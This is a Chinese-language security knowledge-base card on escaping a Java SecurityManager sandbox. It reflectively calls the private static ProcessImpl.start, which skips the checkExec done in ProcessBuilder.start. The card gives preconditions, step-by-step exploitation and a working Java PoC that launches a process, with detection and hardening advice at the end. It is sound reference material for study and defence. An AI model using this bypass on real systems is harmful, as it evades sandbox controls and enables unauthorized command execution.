---
id: binary-pwn-sandbox-escape-processbuilder-checkexec-reflection-skip
title: checkExec 只在 ProcessBuilder.start：反射直呼 ProcessImpl.start 跳过沙箱命令检查
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: securitymanager-checkexec-reflection-processimpl-start
aliases:
- ProcessImpl.start 反射
- 绕过 checkExec
- ProcessBuilder.start 安全检查位置
- 反射跳过 SecurityManager 命令检查
- 私有静态方法 start
tags:
- java
- sandbox-escape
- securitymanager
- reflection
- processimpl
- command-execution
- checkexec
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3
  verified_at: '2026-11-08T00:38:16+08:00'
  notes: 已对照原文与图 01/02 核对：图 01 ProcessBuilder.start 源码顺序为 cmdarray 判空→String prog=cmdarray[0]→SecurityManager security=System.getSecurityManager()→if (security!=null) security.checkExec(prog)→null 字符检查→return ProcessImpl.start(cmdarray,environment,dir,redirects,redirectErrorStream)，与卡内「checkExec 只在 ProcessBuilder.start、ProcessImpl.start 内部不再检查」一致；图 02 调试停在 ProcessImpl.start 调用，cmdarray=[calc]、prog=calc、security=null、dir=null。原文 PoC 的 getDeclaredMethod 签名、(String[] cmdarray, Map environment, String dir, Redirect[] redirects, boolean) 参数与卡内 PoC 一致。未验证点：未在 JDK8 复跑、未核实 ProcessImpl.start 在该 JDK 版本内确实无二次 checkExec（仅由源码截图与常规实现推断）。
---

## 一句话结论

`ProcessBuilder.start()` 的第一件事就是取 `System.getSecurityManager()` 并 `security.checkExec(prog)`，检查通过后才转调 `ProcessImpl.start(...)`；而 `ProcessImpl.start` 自身**不做** `checkExec`。因此只要沙箱允许反射（授予了 `accessDeclaredMembers` 与 `suppressAccessChecks`），`setAccessible(true)` 后直接 invoke 这个私有静态方法，就能在完全没有执行权限的策略下创建进程。

## 原理

- 权限检查的位置决定绕过方式：`checkExec` 只存在于 `ProcessBuilder.start()` 的入口，`ProcessImpl.start(String[] cmdarray, Map<String,String> environment, String dir, ProcessBuilder.Redirect[] redirects, boolean redirectErrorStream)` 是被调用的「下层实现」，它假设调用方已经做过检查。
- 这种「公共 API 做检查、内部实现不做」的设计在 JDK 中很常见（`Runtime.exec` → `ProcessBuilder.start` 也是有检查的那一层），只要攻击者能绕过「哪一层被调用」的约定，权限检查就被跳过。
- 反射是绕过层级的通用手段：`Class.forName("java.lang.ProcessImpl")` → `getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class)` → `setAccessible(true)` → `invoke(null, ...)`。因为它是 `static`，invoke 的目标实例传 `null`。
- 参数需要与实际签名对齐：`cmdarray` 为 argv 数组（不含 shell），`environment`/`dir`/`redirects` 可传 `null`（表示继承父进程环境与工作目录），`redirectErrorStream` 传 `false`。签名错一位就会 `NoSuchMethodException`，可用调试器或 `javap` 确认。
- 之所以在沙箱里特别有效：策略通常只精细地授予了文件/网络权限而忘记限制反射，`accessDeclaredMembers` 与 `suppressAccessChecks` 一旦给出（很多表达式/脚本引擎的默认策略都包含），这条路径就能把「不能执行命令」变成「可以执行命令」。
- 与直接反射 `ProcessImpl` 构造器的差别：构造器路径需要填 `stdHandles` 并触发 native `create`，多用于绕过 RASP 对 `Runtime.exec`/`ProcessBuilder.start` 的 hook；本卡走静态 `start`，重点在于**绕过 SecurityManager 的 `checkExec`**，两处入口的签名与语义不同。

## 触发条件

- 目标启用 SecurityManager 且策略未授予 `FilePermission "<<ALL FILES>>", "execute"`（即正常执行命令会被 `checkExec` 拒绝）。
- 策略授予了反射相关权限：`java.lang.RuntimePermission "accessDeclaredMembers"` 与 `java.lang.reflect.ReflectPermission "suppressAccessChecks"`（或等价的宽泛授权）。
- JDK 允许反射 `java.lang.ProcessImpl` 的私有静态方法（JDK 8 默认可；JDK 9+ 需对 `java.base/java.lang` 开放，沙箱场景通常仍是 8）。
- 攻击者能在该 JVM 内执行任意 Java 代码。

## 利用步骤

1. 先确认沙箱生效且 `Runtime.exec` 被拒（`java.security.AccessControlException: access denied ("java.io.FilePermission" "<<ALL FILES>>" "execute")`）。
2. 用 `javap -p java.lang.ProcessImpl` 或在调试器里确认 `start` 的实际签名（随 JDK 版本略有差异）。
3. 反射取该方法并 `setAccessible(true)`。
4. 以 `new String[]{command}` 作为 `cmdarray`，其余参数按签名传 `null`/`false`，`invoke(null, ...)` 创建进程。
5. 验证命令副作用（弹窗、写文件、外连），确认沙箱检查被跳过。

## PoC

```java
import java.lang.reflect.Method;
import java.util.Map;

public class BypassSandbox {
    public static void main(String[] args) throws Exception {
        reflectProcessImpl("calc");
    }

    public static void reflectProcessImpl(String command) throws Exception {
        Class<?> clz = Class.forName("java.lang.ProcessImpl");
        Method start = clz.getDeclaredMethod("start",
                String[].class, Map.class, String.class,
                ProcessBuilder.Redirect[].class, boolean.class);
        start.setAccessible(true);                       // 需要 suppressAccessChecks
        start.invoke(null, new String[]{command},         // static，目标实例为 null
                null, null, null, false);
    }
}
```

```text
# 对应 JDK 源码位置（ProcessBuilder.start）
String prog = cmdarray[0];
SecurityManager security = System.getSecurityManager();
if (security != null) {
    security.checkExec(prog);      // <-- 唯一的执行检查在这里
}
...
return ProcessImpl.start(cmdarray, environment, dir, redirects, redirectErrorStream);  // 内部不再检查
```

## 变体与关联

- 变体：反射 `ProcessImpl` 私有构造器（`new ProcessImpl(String[], String, String, long[], boolean)`）同样跳过 `checkExec`，但需要填 `stdHandles`；见 `[[web-java-rce-processimpl-constructor-reflect-exec]]`（该卡面向 RASP hook 绕过，本卡面向 SecurityManager 检查绕过）。
- 变体：JDK 9+ 若无法反射 `java.base` 私有成员，改用 `MethodHandles.privateLookupIn`（同样需要模块开放）或 FFM/native 直调；后者见 `[[web-java-rce-ffm-native-system-rasp-bypass]]`。
- 变体：`checkExec` 只检查第一个参数（`prog`），把可执行文件放到策略允许的路径（如已授予 execute 的目录）也能绕过，属于「路径语义」而非「调用层级」绕过。
- 关联：`[[binary-pwn-sandbox-escape-java-setsecuritymanager-null-disable]]` 是直接卸载管理器；本卡是在管理器仍在的情况下绕过它的一条检查。
- 边界：策略禁止反射（无 `suppressAccessChecks`/`accessDeclaredMembers`）、`ProcessImpl.start` 签名与所在 JDK 不符、JDK 9+ 模块未开放、沙箱进程被 seccomp 限制 `fork/execve` 时失败。

## 检测与防御

- 检测：Java 代码对 `java.lang.ProcessImpl`/`java.lang.UNIXProcess` 的 `start` 或私有构造器调用 `setAccessible(true)`；`invoke` 目标为 `null` 且参数含 `String[]` 命令数组；JVM 出现绕过 `ProcessBuilder.start` 的进程创建。
- 修复：策略中不授予 `suppressAccessChecks`/`accessDeclaredMembers`；确需反射时用 `sun.reflect.Reflection.registerMethodsToFilter(ProcessImpl.class, "start")` 与 `registerFieldsToFilter` 把敏感成员加入反射黑名单（启动早期调用，先于不可信代码加载）。
- 加固：把沙箱边界下沉到操作系统（独立低权限账号 + seccomp/AppArmor 禁止 `execve`），不要只依赖 JVM 内 SecurityManager；RASP/EDR 把进程创建 hook 下沉到 native 层。
